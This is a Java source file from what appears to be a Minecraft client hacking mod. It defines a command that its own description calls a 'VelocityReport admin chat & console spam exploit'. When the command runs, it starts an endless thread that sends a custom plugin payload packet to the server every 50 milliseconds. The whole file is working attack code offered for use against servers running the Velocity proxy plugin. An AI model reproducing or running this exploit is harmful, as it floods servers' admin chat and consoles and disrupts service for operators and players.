package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.AuthMeVelocityPayloadPacket;
import io.github.spigotrce.paradiseclientprivate.packets.VelocityReportPayloadPacket;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.util.Random;

public class VelocityReportCommand extends Command {
    public VelocityReportCommand(MinecraftClient minecraftClient) {
        super("paradisevelocityreport", "VelocityReport admin chat & console spam exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        String s = "5786(&*45WTDghCV";
        Random r = new Random();
        return literal(getName())
                .executes(context -> {
                    new Thread(() -> {
                        String randomString = "";
                        for (int i = 0; i < s.length(); i++)
                            randomString += s.charAt(r.nextInt(s.length()));
                        while (true) {
                            Helper.sendPacket(new CustomPayloadC2SPacket(
                                    new VelocityReportPayloadPacket(randomString, randomString)
                            ));
                            try {
                                Thread.sleep(50);
                            } catch (Exception ignored) {}
                        }
                    }).start();
                    return Command.SINGLE_SUCCESS;
                });
    }
}
